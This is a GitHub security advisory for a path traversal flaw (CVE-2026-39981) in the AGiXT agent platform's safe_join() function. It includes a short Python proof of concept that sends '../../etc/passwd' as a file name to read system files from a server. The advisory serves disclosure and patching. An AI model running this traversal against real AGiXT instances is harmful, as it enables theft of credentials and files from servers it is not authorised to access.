# [H] AGiXT Vulnerable to Path Traversal in safe_join()

## Summary
Severity: High
Advisory: GHSA-5gfj-64gh-mgmw
CVE: CVE-2026-39981
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-5gfj-64gh-mgmw
Type: github-advisory

## Affected
- PyPI: `agixt` — affected >=0 <1.9.2

## Details
### Summary
The safe_join() function in the essential_abilities extension fails to validate that resolved file paths remain within the designated agent workspace. An authenticated attacker can use directory traversal sequences to read, write, or delete arbitrary files on the server hosting the AGiXT instance.

### Details
`agixt/endpoints/Extension.py:165` (source) -> `agixt/XT.py:1035` (hop) -> `agixt/extensions/essential_abilities.py:436` (sink)

```python
# source
command_args = command.command_args

# hop
response = await Extensions(...).execute_command(command_name=command_name, command_args=command_args)

# sink
new_path = os.path.normpath(os.path.join(self.WORKING_DIRECTORY, *paths.split("/")))
```
### PoC
 
```python
# tested on: agixt<=1.9.1
# install: pip install agixt==1.9.1
 
import requests
 
BASE = "http://localhost:7437"
TOKEN = "<your_api_key>"
 
headers = {"Authorization": f"Bearer {TOKEN}"}
 
payload = {
    "command_name": "read_file",
    "command_args": {
        "filename": "../../etc/passwd"
    }
}
 
r = requests.post(f"{BASE}/api/agent/MyAgent/command", json=payload, headers=headers)
print(r.text)
# expected output: root:x:0:0:root:/root:/bin/bash ...
```
 
### Impact
 
Authenticated users can read, overwrite, or delete arbitrary files on the host server, enabling credential theft, persistent code execution, or denial of service. Authentication is required but no elevated privileges are needed beyond a valid API key.

## References
- https://github.com/Josh-XT/AGiXT/security/advisories/GHSA-5gfj-64gh-mgmw
- https://nvd.nist.gov/vuln/detail/CVE-2026-39981
- https://github.com/Josh-XT/AGiXT/commit/2079ea5a88fa671a921bf0b5eba887a5a1b73d5f
- https://github.com/Josh-XT/AGiXT
- https://github.com/Josh-XT/AGiXT/releases/tag/v1.9.2
